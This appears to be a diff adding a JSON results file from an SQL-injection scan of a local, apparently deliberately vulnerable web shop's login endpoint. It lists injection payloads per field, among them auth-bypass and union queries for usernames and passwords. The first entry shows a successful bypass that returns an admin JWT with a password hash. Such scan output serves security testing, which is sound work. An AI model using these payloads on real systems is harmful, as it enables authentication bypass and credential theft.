@@ -1,0 +1,327 @@
+{
+    "http://127.0.0.1:3000/rest/user/login": {
+        "method": "POST",
+        "vulnerable_params": [
+            {
+                "field": "email",
+                "payload": "' OR 1=1 --",
+                "test": "boolean_true",
+                "status": 200,
+                "length": 799,
+                "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDYtMTIgMDk6NTA6NTcuMjU0ICswMDowMCIsInVwZGF0ZWRBdCI6IjI",
+                "possible_vuln": true,
+                "db": "Unknown"
+            },
+            {
+                "field": "email",
+                "payload": "' OR 1=2 --",
+                "test": "boolean_false",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "email",
+                "payload": "' UNION SELECT NULL,NULL --",
+                "test": "union_test",
+                "status": 500,
+                "length": 1448,
+                "snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "email",
+                "payload": "' AND 1=1/0 --",
+                "test": "error_test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "email",
+                "payload": "' OR IF(1=1, SLEEP(3), 0) --",
+                "test": "time_mysql",
+                "status": 500,
+                "length": 1448,
+                "snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "email",
+                "payload": "' OR pg_sleep(3) --",
+                "test": "time_pg",
+                "status": 500,
+                "length": 1448,
+                "snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "email",
+                "payload": "' OR 'a'='a",
+                "test": "syntax_error",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "email",
+                "payload": "' UNION SELECT username, password FROM users; -- ",
+                "test": "test",
+                "status": 500,
+                "length": 1448,
+                "snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "username",
+                "payload": "' OR 1=1 --",
+                "test": "boolean_true",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "username",
+                "payload": "' OR 1=2 --",
+                "test": "boolean_false",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "username",
+                "payload": "' UNION SELECT NULL,NULL --",
+                "test": "union_test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "username",
+                "payload": "' AND 1=1/0 --",
+                "test": "error_test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "username",
+                "payload": "' OR IF(1=1, SLEEP(3), 0) --",
+                "test": "time_mysql",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "username",
+                "payload": "' OR pg_sleep(3) --",
+                "test": "time_pg",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "username",
+                "payload": "' OR 'a'='a",
+                "test": "syntax_error",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "username",
+                "payload": "' UNION SELECT username, password FROM users; -- ",
+                "test": "test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "user",
+                "payload": "' OR 1=1 --",
+                "test": "boolean_true",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "user",
+                "payload": "' OR 1=2 --",
+                "test": "boolean_false",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "user",
+                "payload": "' UNION SELECT NULL,NULL --",
+                "test": "union_test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "user",
+                "payload": "' AND 1=1/0 --",
+                "test": "error_test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "user",
+                "payload": "' OR IF(1=1, SLEEP(3), 0) --",
+                "test": "time_mysql",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "user",
+                "payload": "' OR pg_sleep(3) --",
+                "test": "time_pg",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "user",
+                "payload": "' OR 'a'='a",
+                "test": "syntax_error",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "user",
+                "payload": "' UNION SELECT username, password FROM users; -- ",
+                "test": "test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "login",
+                "payload": "' OR 1=1 --",
+                "test": "boolean_true",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "login",
+                "payload": "' OR 1=2 --",
+                "test": "boolean_false",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "login",
+                "payload": "' UNION SELECT NULL,NULL --",
+                "test": "union_test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "login",
+                "payload": "' AND 1=1/0 --",
+                "test": "error_test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "login",
+                "payload": "' OR IF(1=1, SLEEP(3), 0) --",
+                "test": "time_mysql",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "login",
+                "payload": "' OR pg_sleep(3) --",
+                "test": "time_pg",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "login",
+                "payload": "' OR 'a'='a",
+                "test": "syntax_error",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            },
+            {
+                "field": "login",
+                "payload": "' UNION SELECT username, password FROM users; -- ",
+                "test": "test",
+                "status": 401,
+                "length": 26,
+                "snippet": "Invalid email or password.",
+                "possible_vuln": false,
+                "db": "Unknown"
+            }
+        ]
+    }
+}
